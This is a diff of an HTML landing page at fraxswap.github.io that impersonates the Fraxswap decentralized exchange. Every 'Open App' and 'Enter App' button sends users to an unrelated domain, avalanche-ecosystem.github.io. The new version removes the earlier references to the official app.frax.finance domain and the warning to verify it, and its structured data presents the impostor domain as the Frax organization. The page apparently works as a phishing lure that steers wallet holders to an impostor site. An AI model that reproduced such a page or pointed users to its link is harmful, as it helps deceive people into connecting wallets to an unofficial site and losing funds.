@@ -1,47 +1,90 @@
 <!doctype html>
-<html lang="en"><head>
-<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>Fraxswap - Open App</title><meta name="description" content="fraxswap opens the official Frax swap app for token swaps, TWAMM orders, and liquidity routes across supported networks.">
-<meta name="robots" content="index,follow,max-image-preview:large">
-<link rel="canonical" href="https://fraxswap.github.io/"><meta name="theme-color" content="#FFFFFF">
-<meta property="og:type" content="website"><meta property="og:title" content="Fraxswap - Open App"><meta property="og:description" content="fraxswap opens the official Frax swap app for token swaps, TWAMM orders, and liquidity routes across supported networks.">
-<meta property="og:url" content="https://fraxswap.github.io/"><meta property="og:image" content="https://fraxswap.github.io/og-cover.png"><meta property="og:locale" content="en">
-<meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Fraxswap - Open App"><meta name="twitter:description" content="fraxswap opens the official Frax swap app for token swaps, TWAMM orders, and liquidity routes across supported networks."><meta name="twitter:image" content="https://fraxswap.github.io/og-cover.png">
-<link rel="icon" href="favicon.png" type="image/png"><link rel="manifest" href="site.webmanifest"><link rel="apple-touch-icon" href="static/icon-180.png">
-<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600;700&display=swap">
-<link rel="stylesheet" href="static/style.css">
-<script type="application/ld+json">{"@context": "https://schema.org", "@graph": [{"@type": "WebSite", "@id": "https://fraxswap.github.io/#website", "url": "https://fraxswap.github.io/", "name": "Fraxswap"}, {"@type": "WebPage", "@id": "https://fraxswap.github.io/#webpage", "url": "https://fraxswap.github.io/", "name": "Fraxswap - Open App", "description": "fraxswap opens the official Frax swap app for token swaps, TWAMM orders, and liquidity routes across supported networks.", "inLanguage": "en", "isPartOf": {"@id": "https://fraxswap.github.io/#website"}}, {"@type": "Organization", "@id": "https://fraxswap.github.io/#org", "name": "Fraxswap", "url": "https://fraxswap.github.io/", "logo": "https://fraxswap.github.io/og-cover.png", "sameAs": ["https://twitter.com/fraxfinance", "https://github.com/FraxFinance", "https://www.coingecko.com/en/coins/frax", "https://defillama.com/protocol/frax-swap"]}, {"@type": "WebApplication", "@id": "https://fraxswap.github.io/#app", "name": "Fraxswap", "url": "https://fraxswap.github.io/", "applicationCategory": "FinanceApplication", "operatingSystem": "Web", "browserRequirements": "Requires JavaScript", "description": "fraxswap opens the official Frax swap app for token swaps, TWAMM orders, and liquidity routes across supported networks.", "featureList": ["Frax Finance docs", "TWAMM-enabled AMM", "V2 contract addresses"], "isPartOf": {"@id": "https://fraxswap.github.io/#website"}}, {"@type": "FAQPage", "@id": "https://fraxswap.github.io/#faq", "inLanguage": "en", "mainEntity": [{"@type": "Question", "name": "What is Fraxswap?", "acceptedAnswer": {"@type": "Answer", "text": "Fraxswap is Frax Finance's permissionless AMM with an embedded TWAMM for long-term orders. The core is based on a Uniswap V2-style constant-product model, but Fraxswap adds time-weighted execution features designed for large or sustained trades."}}, {"@type": "Question", "name": "Does Fraxswap support TWAMM?", "acceptedAnswer": {"@type": "Answer", "text": "Yes. TWAMM support is the main reason Fraxswap stands out. The official docs describe Fraxswap as a constant-product AMM with an embedded time-weighted average market maker. Users still need to distinguish between a standard swap and any long-term order flow in the live interface."}}, {"@type": "Question", "name": "Which chains is Fraxswap on?", "acceptedAnswer": {"@type": "Answer", "text": "The official Fraxswap V2 contract page lists deployments on Arbitrum, Avalanche, Binance Smart Chain, Ethereum, Fantom, Fraxtal, Moonbeam, Moonriver, Optimism and Polygon. Pair liquidity can differ significantly by chain, so the live quote matters more than the deployment list alone."}}, {"@type": "Question", "name": "What tokens are usually swapped on Fraxswap?", "acceptedAnswer": {"@type": "Answer", "text": "Fraxswap is naturally associated with Frax ecosystem assets such as FRAX and FXS, plus paired assets on supported networks. Since Fraxswap is permissionless, available pairs can vary. Users should check the app for pool liquidity, token contracts and price impact before assuming a pair is active."}}, {"@type": "Question", "name": "Is Fraxswap the same as Fraxlend?", "acceptedAnswer": {"@type": "Answer", "text": "No. Fraxswap is the AMM and TWAMM swap product. Fraxlend is a separate Frax Finance lending product. Searchers looking to swap FRAX, FXS or related assets should use the swap interface, while borrowing or lending research belongs to Fraxlend documentation."}}, {"@type": "Question", "name": "Where are Fraxswap contract addresses?", "acceptedAnswer": {"@type": "Answer", "text": "Frax publishes Fraxswap V1 and V2 contract addresses in its official documentation. Use that page or the official app rather than addresses from social posts. For V2, the docs list factory and router addresses by chain, including Ethereum, Fraxtal, Arbitrum, Avalanche, BSC, Optimism and Polygon."}}]}]}</script>
-</head><body>
-<header class="site-header">
-  <a class="brand" href="#top" aria-label="Fraxswap"><img class="brand-mark" src="favicon.png" alt="" width="34" height="34"><span class="brand-name">Fraxswap</span></a>
-  <nav class="site-nav" aria-label="Primary"><ul class="nav-list"><li><a href="#about">About</a></li><li><a href="#facts">Overview</a></li><li><a href="#faq">FAQ</a></li></ul></nav>
-  <span class="header-spacer"></span>
-  <a class="btn btn-dark header-cta" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a>
-  <button class="nav-toggle" aria-label="Menu" aria-expanded="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
-</header>
-<main id="top">
-  <section class="hero">
-    <div class="hero-deco" aria-hidden="true"><span class="strip"></span><span class="d1"></span><span class="d2"></span><span class="d3"></span><span class="d4"></span><span class="d5"></span></div>
-    <div class="container">
-      <h1>Fraxswap</h1>
-      <div class="bridge-widget" role="group" aria-label="Fraxswap preview"><div class="bw-field"><span class="bw-coin mono">FRAX</span><span class="bw-meta"><span class="bw-amount">0</span><span class="bw-sub"><b>FRAX</b> · Ethereum</span></span></div><button class="bw-switch" type="button" aria-label="Switch"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 9h13M17 9l-4-4M17 9l-4 4M20 15H7M7 15l4-4M7 15l4 4"/></svg></button><div class="bw-field"><span class="bw-coin mono">FXS</span><span class="bw-meta"><span class="bw-amount">0.0</span><span class="bw-sub"><b>FXS</b> · Ethereum</span></span></div><a class="btn btn-dark bw-go" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a></div>
-      <div class="hero-go"><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open Fraxswap ↗</a></div>
-      <p class="hero-note">Live preview — open the official Fraxswap app from your own wallet.</p>
-      <div class="trust-row"><span class="trust-chip">Frax Finance docs</span><span class="trust-chip">TWAMM-enabled AMM</span><span class="trust-chip">V2 contract addresses</span></div>
-    </div>
-  </section>
-  <section class="section" id="about"><div class="container"><h2>What is Fraxswap?</h2><div class="capsule"><strong>Fraxswap</strong> is Frax Finance's permissionless AMM with an embedded TWAMM for long-term orders; the <a href='https://docs.frax.finance/fraxswap/overview'>official docs</a> describe a <a class="inline-link" href="https://docs.uniswap.org/protocol/V2/concepts/protocol-overview/how-uniswap-works" rel="noopener noreferrer">Uniswap V2-style constant-product core</a> extended for <a class="inline-link" href="https://www.paradigm.xyz/2021/07/twamm" rel="noopener noreferrer">time-weighted execution</a>.</div></div></section>
-  <section class="section" id="facts"><div class="container"><h2>Fraxswap at a glance</h2><div class="facts"><div class="f"><small>Category</small><b>TWAMM-enabled AMM</b></div><div class="f"><small>Network</small><b>Ethereum, Fraxtal and multiple <a class="inline-link" href="https://ethereum.org/en/developers/docs/evm/" rel="noopener noreferrer">EVM chains</a></b></div><div class="f"><small>Token</small><b>FRAX</b></div><div class="f"><small>Custody</small><b><a class="inline-link" href="https://www.investopedia.com/terms/n/noncustodial-wallet.asp" rel="noopener noreferrer">Non-custodial</a> AMM contracts</b></div><div class="f"><small>Official app</small><b>app.frax.finance/swap/main</b></div></div></div></section>
-  <section class="section section-alt"><div class="container"><h2>Fraxswap TWAMM orders</h2><div class="intent-a">Fraxswap is searched specifically because it is not just another Uniswap-style swap page. The official Frax docs describe Fraxswap as a constant-product AMM with an embedded <a class="inline-link" href="https://www.paradigm.xyz/2021/07/twamm" rel="noopener noreferrer">time-weighted average market maker</a>, or TWAMM, for conducting large trades over longer periods. TWAMM-style execution can help split a large order over time instead of pushing the full amount through at once. Users should still check token pair liquidity, order duration, <a class="inline-link" href="https://docs.uniswap.org/protocol/V2/concepts/advanced-topics/understanding-returns" rel="noopener noreferrer">price impact</a>, <a class="inline-link" href="https://academy.binance.com/en/glossary/slippage" rel="noopener noreferrer">slippage</a>, gas and whether they are placing a normal swap or a long-term order before signing.</div></div></section><section class="section"><div class="container"><h2>Fraxswap fees and V2 pools</h2><div class="intent-a">Fraxswap V2 introduced support for different <a class="inline-link" href="https://www.investopedia.com/terms/l/liquidityprovider.asp" rel="noopener noreferrer">LP fees</a> per pool, according to the official contract-address documentation. That means there is no single Fraxswap fee that applies to every pair and chain. Fee impact also combines with <a class="inline-link" href="https://defillama.com/protocols/dexs" rel="noopener noreferrer">pool liquidity</a>, price movement, slippage and gas. Users comparing Fraxswap fees should inspect the live app quote for the specific FRAX, FXS or Frax ecosystem pair they want to trade, then compare the net received amount against another DEX route rather than relying on a generic fee percentage.</div></div></section><section class="section section-alt"><div class="container"><h2>Fraxswap supported networks and contracts</h2><div class="intent-a">Fraxswap V2 contract documentation lists deployments on <a class="inline-link" href="https://www.coingecko.com/en/coins/arbitrum" rel="noopener noreferrer">Arbitrum</a>, Avalanche, <a class="inline-link" href="https://academy.binance.com/en/glossary/binance-smart-chain" rel="noopener noreferrer">Binance Smart Chain</a>, Ethereum, Fantom, Fraxtal, Moonbeam, Moonriver, Optimism and Polygon. The official docs also provide factory and router addresses for those networks. A user should not copy contract addresses from social posts or ads; use the Frax documentation or the official app. When switching chains, confirm the correct native gas token and verify whether the desired pair exists with enough liquidity on that chain.</div></div></section><section class="section"><div class="container"><h2>How to swap FRAX and <a class="inline-link" href="https://www.coingecko.com/en/coins/frax-share" rel="noopener noreferrer">FXS</a> on Fraxswap</h2><div class="intent-a">To swap FRAX and FXS on Fraxswap, open <a href="https://app.frax.finance/swap/main">the official Frax swap app</a>, connect a wallet, select the intended network, choose FRAX as the input or output token, choose FXS or another Frax ecosystem asset, and review the quote. Check whether the transaction is a normal swap or a TWAMM-related action, then inspect price impact, slippage, route, <a class="inline-link" href="https://ethereum.org/en/developers/docs/standards/tokens/erc-20/" rel="noopener noreferrer">approval amount</a> and gas. Confirm only from the app.frax.finance domain.</div></div></section>
-  <section class="section"><div class="container"><h2>How to swap Fraxswap</h2><ol class="steps"><li><b>Open the app</b><span>Use the official Frax swap route, connect a <a class="inline-link" href="https://messari.io/project/web3/profile" rel="noopener noreferrer">Web3 wallet</a>, and select the network you want to use.</span></li><li><b>Choose tokens</b><span>Pick the input and output assets, then review the displayed route, price impact, and slippage settings.</span></li><li><b>Review timing</b><span>Use a standard swap for immediate execution or review TWAMM order details when placing longer-term trades.</span></li><li><b>Confirm on-chain</b><span>Approve the token if required, submit the transaction, and verify the result in your wallet or explorer.</span></li></ol><div class="cta-band"><div><p>Ready to swap?</p><p class="sub">Open the official Fraxswap app and verify the domain before you sign.</p></div><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open Fraxswap ↗</a></div></div></section>
-  <section class="section"><div class="container"><h2>Fraxswap vs Uniswap V2</h2><div class="cmp-wrap"><table class="cmp-table"><thead><tr><th>Dimension</th><th>Fraxswap</th><th>Uniswap V2</th></tr></thead><tbody><tr><td>Core model</td><td><a class="inline-link" href="https://www.gemini.com/cryptopedia/amm-constant-product-formula" rel="noopener noreferrer">Constant-product AMM</a> with embedded TWAMM</td><td>Constant-product AMM</td></tr><tr><td>Special feature</td><td>Long-term time-weighted orders</td><td>Simple pool swaps and <a class="inline-link" href="https://docs.frax.finance/fraxswap/overview" rel="noopener noreferrer">LP positions</a></td></tr><tr><td>Ecosystem fit</td><td>Frax assets such as FRAX and FXS</td><td>Broad token pairs across deployments</td></tr><tr><td>Best fit</td><td>Large or scheduled trades and Frax liquidity</td><td>Simple direct pool swaps</td></tr></tbody></table></div></div></section>
-  <section class="section section-alt" id="faq"><div class="container"><h2>Fraxswap FAQ</h2><div class="faq-list"><details open><summary><h3>What is Fraxswap?</h3></summary><div>Fraxswap is Frax Finance's permissionless AMM with an embedded TWAMM for long-term orders. The core is based on a Uniswap V2-style <a class="inline-link" href="https://www.coindesk.com/learn/what-is-an-automated-market-maker/" rel="noopener noreferrer">constant-product model</a>, but Fraxswap adds time-weighted execution features designed for large or sustained trades.</div></details><details><summary><h3>Does Fraxswap support TWAMM?</h3></summary><div>Yes. TWAMM support is the main reason Fraxswap stands out. The official docs describe Fraxswap as a constant-product AMM with an embedded time-weighted average market maker. Users still need to distinguish between a <a class="inline-link" href="https://docs.frax.finance/fraxswap/technical-specifications" rel="noopener noreferrer">standard swap</a> and any long-term order flow in the live interface.</div></details><details><summary><h3>Which chains is Fraxswap on?</h3></summary><div>The official Fraxswap V2 contract page lists deployments on Arbitrum, Avalanche, Binance Smart Chain, Ethereum, Fantom, Fraxtal, Moonbeam, Moonriver, Optimism and Polygon. Pair liquidity can differ significantly by chain, so the live quote matters more than the deployment list alone.</div></details><details><summary><h3>What tokens are usually swapped on Fraxswap?</h3></summary><div>Fraxswap is naturally associated with Frax ecosystem assets such as FRAX and FXS, plus paired assets on supported networks. Since Fraxswap is permissionless, available pairs can vary. Users should check the app for pool liquidity, token contracts and price impact before assuming a pair is active.</div></details><details><summary><h3>Is Fraxswap the same as Fraxlend?</h3></summary><div>No. Fraxswap is the AMM and TWAMM swap product. Fraxlend is a separate Frax Finance lending product. Searchers looking to swap FRAX, FXS or related assets should use the swap interface, while borrowing or lending research belongs to Fraxlend documentation.</div></details><details><summary><h3>Where are Fraxswap contract addresses?</h3></summary><div>Frax publishes Fraxswap V1 and V2 contract addresses in its official documentation. Use that page or the official app rather than addresses from social posts. For V2, the docs list factory and router addresses by chain, including Ethereum, Fraxtal, Arbitrum, Avalanche, BSC, Optimism and Polygon.</div></details></div></div></section>
-</main>
-<footer class="site-footer"><div class="container">
-  <div class="footer-grid"></div>
-  <p class="footer-note">This page is not the official app; verify app.frax.finance before connecting. Educational only, not financial advice.</p>
-  <p class="footer-meta"><a href="#top">Back to top ↑</a></p>
-</div></footer>
-<script src="static/app.js" defer></script>
-</body></html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Fraxswap</title>
+  <meta name="description" content="Fraxswap swaps FRAX and other tokens from your own wallet on the Frax ecosystem.">
+  <link rel="canonical" href="https://fraxswap.github.io/">
+  <meta name="robots" content="index,follow,max-image-preview:large">
+  <meta name="theme-color" content="#F4F6FB">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Fraxswap">
+  <meta property="og:description" content="Fraxswap swaps FRAX and other tokens from your own wallet on the Frax ecosystem.">
+  <meta property="og:url" content="https://fraxswap.github.io/">
+  <meta property="og:image" content="https://fraxswap.github.io/og-cover.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Fraxswap">
+  <meta name="twitter:description" content="Swap FRAX and other tokens from your own wallet on the Frax ecosystem.">
+  <link rel="icon" type="image/png" href="favicon.png">
+  <link rel="manifest" href="site.webmanifest">
+  <link rel="apple-touch-icon" href="favicon.png">
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <header class="topbar">
+    <a class="brand" href="#"><img src="favicon.png" width="28" height="28" alt="" style="border-radius:50%"> Fraxswap</a>
+    <nav class="nav" aria-label="Trusted references">
+      <a href="https://etherscan.io/" target="_blank" rel="nofollow noopener noreferrer">Etherscan</a>
+      <a href="https://www.coingecko.com/" target="_blank" rel="nofollow noopener noreferrer">CoinGecko</a>
+      <a href="https://ethereum.org/defi/" target="_blank" rel="nofollow noopener noreferrer">DeFi guide</a>
+    </nav>
+    <span class="sp"></span>
+    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
+  </header>
+
+  <main class="stage">
+    <h1>Fraxswap</h1>
+    <p class="sub"><strong>Fraxswap</strong> swaps FRAX and other tokens from your own wallet on the Frax ecosystem.</p>
+
+    <section class="card" aria-label="Swap route">
+      <div class="route">
+        <div class="leg">
+          <span class="lbl">From</span>
+          <span class="chip">
+            <img class="ic" src="frax.png" width="26" height="26" alt="FRAX">
+            <span class="t">FRAX</span>
+          </span>
+        </div>
+        <button class="dir" type="button" data-dir aria-label="Switch direction"><span class="ar">&#8594;</span></button>
+        <div class="leg">
+          <span class="lbl">To</span>
+          <span class="chip">
+            <img class="ic" src="eth.png" width="26" height="26" alt="ETH">
+            <span class="t">ETH</span>
+          </span>
+        </div>
+      </div>
+      <a class="act" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App <span aria-hidden="true">&#8250;</span></a>
+      <p class="note">Preview only &mdash; rates and routes are shown in the app.</p>
+    </section>
+  </main>
+
+  <footer class="foot">
+    <b>Fraxswap</b> &mdash; 2026
+  </footer>
+
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@graph": [
+      { "@type": "WebSite", "@id": "https://avalanche-ecosystem.github.io/#website", "url": "https://avalanche-ecosystem.github.io/", "name": "Fraxswap", "inLanguage": "en" },
+      { "@type": "Organization", "@id": "https://avalanche-ecosystem.github.io/#org", "name": "Frax", "url": "https://avalanche-ecosystem.github.io/", "sameAs": ["https://frax.finance/","https://x.com/fraxfinance","https://github.com/FraxFinance"] },
+      { "@type": "WebApplication", "@id": "https://avalanche-ecosystem.github.io/#app", "name": "Fraxswap", "applicationCategory": "FinanceApplication", "operatingSystem": "Web", "url": "https://avalanche-ecosystem.github.io/", "offers": { "@type": "Offer", "price": "0", "priceCurrency": "USD" } }
+    ]
+  }
+  </script>
+
+  <script>
+  (function(){
+    "use strict";
+    var root=document, btn=root.querySelector('[data-dir]');
+    if(!btn) return;
+    btn.addEventListener('click', function(){
+      var chips=root.querySelectorAll('.leg .chip');
+      if(chips.length>=2){ var t=chips[0].innerHTML; chips[0].innerHTML=chips[1].innerHTML; chips[1].innerHTML=t; }
+    });
+  })();
+  </script>
+</body>
+</html>
